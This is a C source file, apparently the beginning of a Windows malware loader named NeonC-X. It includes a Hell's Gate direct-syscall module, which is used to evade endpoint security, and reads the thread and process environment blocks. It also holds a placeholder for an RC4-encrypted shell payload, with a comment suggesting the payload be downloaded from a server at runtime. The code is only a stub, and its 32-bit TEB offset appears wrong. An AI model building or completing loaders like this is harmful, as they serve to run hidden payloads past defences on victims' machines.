
/*
	MAIN.C FILE
	that contains the entry point of the loader + the rc4 encrypted payload
*/


#include <Windows.h>
#include <stdio.h>
#include "HellsGate.c"
#include "includes/structs.h"



PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);  // 64-bit: Read GS register at offset 0x30 to get TEB
#else
	return (PTEB)__readfsdword(0x16);  // 32-bit: Read FS register at offset 0x16 to get TEB
#endif
}



// defining the '_fltused' symbol - defined in the CRT library
float _fltused = 0;




char* shell_payload = "RC4_ENCRYPTED_PAYLOAD_HERE";  // we should also maybe store the payload on a server and download it at runtime

int main() {
	printf("Hello, NeonC-X!\n");
	//these need to be defined in the PEB and TEB structures(SO ELSE WHERE)
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPep = pCurrentTeb->ProcessEnvironmentBlock;
    return 0;
}


